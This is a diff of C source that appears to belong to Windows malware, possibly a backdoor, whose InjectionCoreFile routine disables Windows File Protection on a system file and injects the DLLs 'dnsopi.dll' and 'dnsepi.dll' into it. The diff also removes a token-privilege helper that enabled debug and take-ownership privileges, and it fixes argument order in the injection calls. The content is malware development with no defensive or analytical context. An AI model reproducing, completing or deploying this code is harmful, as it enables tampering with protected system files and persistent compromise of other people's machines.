@@ -89,35 +89,8 @@ typedef struct _BUSINESS_DATA {
 	CHAR szEncodeSockIP[MAX_IP_STRING_LEN + 1];
 }BUSINESS_DATA,* PBUSINESS_DATA;
 
-BOOL EnablePrivilege(LPCTSTR lpszPrivilegeName, BOOL bEnable)
-{
-	HANDLE hToken;
-	TOKEN_PRIVILEGES tp;
-	LUID luid;
-
-	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES |
-		TOKEN_QUERY | TOKEN_READ, &hToken))
-		return FALSE;
-	if (!LookupPrivilegeValue(NULL, lpszPrivilegeName, &luid))
-		return TRUE;
-
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	tp.Privileges[0].Attributes = (bEnable) ? SE_PRIVILEGE_ENABLED : 0;
-
-	AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, NULL, NULL);
-
-	CloseHandle(hToken);
-
-	return (GetLastError() == ERROR_SUCCESS);
-
-}
-
 void InjectionCoreFile() {
 	char szTargetPath[MAX_PATH + 1] = { 0 };
-
-	EnablePrivilege(SE_DEBUG_NAME, TRUE);
-	EnablePrivilege(SE_TAKE_OWNERSHIP_NAME, TRUE);
 
 	//////////////////////////////////////////////////////////////////////////
 
@@ -133,7 +106,7 @@ void InjectionCoreFile() {
 	}
 
 	DisableWFP(szTargetPath);
-	AddDllToFile("dnsopi.dll", szTargetPath);
+	AddDllToFile(szTargetPath, "dnsopi.dll");
 
 	//////////////////////////////////////////////////////////////////////////
 
@@ -142,7 +115,7 @@ void InjectionCoreFile() {
 	}
 
 	DisableWFP(szTargetPath);
-	AddDllToFile("dnsepi.dll", szTargetPath);
+	AddDllToFile(szTargetPath, "dnsepi.dll");
 
 }
 
